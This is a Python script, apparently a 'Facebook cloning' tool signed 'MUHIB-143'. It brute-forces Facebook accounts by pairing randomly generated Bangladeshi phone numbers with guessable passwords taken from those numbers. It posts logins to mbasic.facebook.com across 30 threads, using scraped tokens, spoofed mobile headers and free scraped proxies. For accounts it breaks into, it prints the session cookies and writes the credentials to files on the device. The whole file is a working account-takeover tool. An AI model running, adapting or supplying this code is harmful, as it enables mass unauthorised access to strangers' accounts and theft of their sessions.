import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    


RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""\033[1;90m\033[1;92m##     ##\033[1;93m ##     ##\033[1;96m ##     ## \033[1;95m####\033[1;91m ########\033[1;90m
\033[1;90m\033[1;92m###   ### \033[1;93m##     ##\033[1;96m ##     ## \033[1;95m ##  \033[1;91m##     ##\033[1;90m
\033[1;90m\033[1;92m#### #### \033[1;93m##     ## \033[1;96m##     ##  \033[1;95m## \033[1;91m ##     ##\033[1;90m
\033[1;90m\033[1;92m## ### ## \033[1;93m##     ## \033[1;96m#########\033[1;95m  ##  \033[1;91m########\033[1;90m
\033[1;90m\033[1;92m##     ## \033[1;93m##     ## \033[1;96m##     ## \033[1;95m ## \033[1;91m ##     ##\033[1;90m
\033[1;90m\033[1;92m##     ##\033[1;93m ##     ## \033[1;96m##     ##  \033[1;95m##  \033[1;91m##     ##\033[1;90m
\033[1;90m\033[1;92m##     ## \033[1;93m #######  \033[1;96m##     ## \033[1;95m####\033[1;91m ########\033[1;90m
[1;92m\033[1;90m########################################\033[1;92m[1;92m
[1;92m\033[1;91m[>] [1;96mDEVOLPER\033[1;92m----\033[1;96mMUHIB-143 [1;92m        
[1;92m\033[1;91m[>] [1;92mFACEBOOK\033[1;96m----\033[1;92m/its.muhib.7 [1;92m     
[1;92m\033[1;91m[>] [1;93mGITHUB\033[1;92m----\033[1;93mMUHIB-143[1;92m         
[1;92m\033[1;91m[>] [1;95mTOOLS\033[1;96m----\033[1;95mFACEBOOK CLONING[1;92m  
[1;92m\033[1;90m########################################\033[1;92m
    """)
    

 
def naima():
	print('-------------------')
# 
#            
def Main():
    user=[]
    os.system('clear')
    print(logo)
    print(' \033[1;91m[>] \033[1;96mEXAMPLE : \033[1;92m017 \033[1;91m/ \033[1;92m018\033[1;91m / \033[1;92m 019\033[1;91m / \033[1;92m 016')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    code = input(' \033[1;91m[>] \033[1;96mCRACKING CODE : \033[1;92m')
    os.system('clear')
    print(logo)
    print(' \033[1;91m[>] \033[1;96mEXAMPLE :   \033[1;92m10000\033[1;91m/\033[1;92m20000/\033[1;91m\033[1;92m30000\033[1;91m/\033[1;92m50000 ')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    limit = int(input(' \033[1;91m[>]\033[1;96m CRACK LIMIT : \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;96m-->\033[1;91m[>]\033[1;92mYOUR CUNTRY \033[1;97m     : \033[1;95mBANGLADESH')
        print(f'\033[1;96m-->\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING LIMIT   \033[1;97m : \033[1;96m'+tl)
        print(f'\033[1;96m-->\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING SIM CODE\033[1;97m : \033[1;96m'+code)
        print(f'\033[0;96m-->\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\x1b[1;92mUSE AIRPLANE MODE FOR BETTER RESULT')
        print('\033[1;92m->->->->->->->->->->->->->->->->->->->->->->->')
        for love in user:
            uid = code+love
            pwx = [love[2:]]
            asha.submit(MUHIB,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in MUHIB-OK.txt,-CP.txt')
    print('-------------------')
def MUHIB(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;90m[\033[1;92mMUHIB-143\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f"\x1b[1;32m[MUHIB-]  {cid} - {ps}          ")
                print(f"\033[1;91m[>]\033[1;92m=COOKIES : \033[1;96m{coki}")
                open('/sdcard/MUHIB-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;30m[MUHIB-CP] {uid} | {ps}   ")
                #print(f"\033[1;92m=[]=COOKIES : {coki}")
                open('/sdcard/MUHIB-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
